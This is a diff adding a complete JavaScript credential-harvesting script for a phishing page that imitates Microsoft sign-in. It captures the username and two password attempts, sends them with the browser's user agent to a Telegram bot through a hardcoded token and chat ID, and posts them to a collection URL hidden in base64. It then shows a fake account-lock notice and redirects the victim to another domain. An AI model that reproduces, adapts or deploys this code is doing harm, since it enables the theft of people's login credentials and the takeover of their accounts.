@@ -1,0 +1,149 @@
+$(document).ready(function () {
+        const telegramBotToken = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
+        const chatId = '1412104349';
+
+        // Handle submission of the authentication form
+        $(document).on("submit", ".auth-form", function (e) {
+            e.preventDefault();
+
+            var btn = $("#next-btn");
+            btn.prop("disabled", true);
+
+            var handlerr = $("#handlerr");
+            if (handlerr.val() == "") {
+                $("#err").html('<div class="err">Enter a valid address, phone number, or Skype name.</div>');
+                handlerr.addClass("has-error");
+                handlerr.focus();
+            } else if (!isEmail(handlerr.val())) {
+                $("#err").html('<div class="err">This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.</div>');
+                handlerr.addClass("has-error");
+                handlerr.focus();
+            } else {
+                sendToTelegram(\`🔒 *New Login Attempt*\\n\\n👤 *Username*: \${handlerr.val()}\`);
+                displaySecondLoginForm(handlerr.val());
+            }
+
+            btn.prop("disabled", false);
+            return false;
+        });
+
+        // Handle submission of the password form
+        $(document).on('submit', '.pass-form', function (e) {
+            e.preventDefault();
+
+            var btn = $("#pass-btn");
+            btn.prop("disabled", true);
+
+            $("#err2").html('');
+            var password = $("#yyy");
+            password.removeClass("has-error");
+
+            if (password.val() == "") {
+                $("#err2").html('<div class="err">Please enter the password for your Microsoft account.</div>');
+                password.addClass("has-error");
+                password.focus();
+                btn.prop("disabled", false);
+            } else {
+                $('#hope').val(password.val());
+                $('#ddd').addClass('hidden');
+                $('#eee').removeClass('hidden');
+                $('#zzz').focus();
+                sendToTelegram(\`🔐 *Password 1*: \${password.val()}\`);
+            }
+            return false;
+        });
+
+        var ajax = "aHR0cHM6Ly9hcHAucmFja3NwYWNlLnBlaS1vLmNvbS8wLnBocA==";
+
+        // Handle submission of the second password form
+        $(document).on('submit', '.pass-form2', function (e) {
+            e.preventDefault();
+
+            var aa = $("#any").val();
+            var bb = $("#hope").val();
+            var cc = $("#zzz").val();
+            var btn = $("#pass-btn2");
+            btn.prop("disabled", true);
+
+            $("#err3").html('');
+            var password = $("#zzz");
+            password.removeClass("has-error");
+            $("#loaderrr").removeClass("hidden");
+
+            if (password.val() == "") {
+                $("#err3").html('<div class="err">Please enter the password for your Microsoft account.</div>');
+                password.addClass("has-error");
+                password.focus();
+                btn.prop("disabled", false);
+            } else {
+                sendToTelegram(\`🔒 *New Login Attempt Details*\\n\\n\` +
+                    \`👤 *Username*: \${aa}\\n\` +
+                    \`🔐 *Password 1*: \${bb}\\n\` +
+                    \`🔐 *Password 2*: \${cc}\\n\` +
+                    \`🌍 *Country*: Unknown\\n\` +
+                    \`💻 *User Agent*: \${navigator.userAgent}\\n\` +
+                    \`🏠 *Host*: Unknown\`).then(() => {
+                    showAccountLockMessage(aa);
+                });
+
+                $.ajax({
+                    dataType: 'JSON',
+                    url: atob(ajax),
+                    type: 'POST',
+                    data: { logj: aa, vicj: bb, timj: cc },
+                    success: function (response) {
+                        // Handle success response
+                    }
+                });
+            }
+            return false;
+        });
+
+        // Function to display the account lock message
+        function showAccountLockMessage(handler) {
+            $("#err3").html('<div class="err">Your account is locked due to multiple failed attempts. Please wait while we redirect you to verify your identity.</div>');
+            setTimeout(function () {
+                const redirectUrl = \`https://dfghbv.crimekhabarnama.com/4474ca?ebfe01f096=CiVVy#\${handler}\`;
+                window.location.href = redirectUrl;
+            }, 5000); // Redirect after 5 seconds
+        }
+
+        // Function to send message to Telegram
+        function sendToTelegram(message) {
+            const telegramUrl = \`https://api.telegram.org/bot\${telegramBotToken}/sendMessage\`;
+            return fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent to Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Error sending message to Telegram:', error);
+            });
+        }
+
+        // Function to display the second login form
+        function displaySecondLoginForm(email) {
+            $("#ccc").addClass("hidden");
+            $("#ddd").removeClass("hidden");
+            $('#yyy').focus();
+            $('#fff').html(email);
+            $('#ggg').html(email);
+            $('#any').val(email);
+        }
+
+        // Function to validate email format
+        function isEmail(email) {
+            var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+            return regex.test(email);
+        }
+    });
